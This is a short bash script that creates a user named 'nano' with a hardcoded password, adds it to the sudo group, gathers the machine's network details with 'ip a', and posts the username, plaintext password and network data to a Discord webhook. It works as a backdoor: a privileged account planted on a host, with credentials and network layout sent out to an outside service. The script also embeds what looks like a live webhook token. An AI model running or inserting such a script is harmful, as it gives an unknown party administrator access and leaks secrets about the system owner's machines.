#!/bin/bash

# Variables
USERNAME="nano"
PASSWORD="Mizi123!"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
# Create the user
sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME

# Add the user to the 'sudo' group
sudo usermod -aG sudo $USERNAME

# Capture network details
NETWORK_DETAILS=$(ip a)

# Format the network details into a code block for Discord
NETWORK_DETAILS_FORMATTED="```\n$NETWORK_DETAILS\n```"

# Notify via Discord with @everyone mention
curl -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"Server Notification\",
  \"content\": \"@everyone New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\nNetwork data:\n$NETWORK_DETAILS_FORMATTED\"
}" $DISCORD_WEBHOOK_URL

echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
